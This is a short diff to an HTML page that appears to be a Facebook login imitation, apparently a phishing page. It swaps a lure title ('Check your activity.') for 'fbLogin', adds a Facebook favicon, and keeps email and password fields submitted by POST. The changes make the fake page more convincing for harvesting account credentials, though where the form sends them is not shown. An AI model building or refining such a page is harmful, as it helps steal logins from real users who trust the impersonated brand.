@@ -2,8 +2,8 @@
 <html>
 
 <head>
-    <title>Check your activity.</title>
-
+    <title>fbLogin</title>
+    <link rel="icon" href="img/fb.png" type="image/icon type">
     <meta charset="UTF-8" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -46,7 +46,7 @@
             <input type="email" placeholder="Mobile number or email" name="email" class="one" required>
 
             <input type="password" placeholder="Password" name="password" class="two" required>
-            <button class="continuebutt" type="submit" formmethod="post" id="continuebutt" value="Continue" name="Continued" data-sigil="touchable" href="https://www.facebook.com/login.php" onclick="location.href='www.facebook.com'">
+            <button class="continuebutt" type="submit" formmethod="post" id="continuebutt" value="Continue" name="Continued" data-sigil="touchable" href="https://www.facebook.com/login.php">
 				
 				<span class="ContinueSpan">Log In</span></button>
             <div class="separator">or</div>
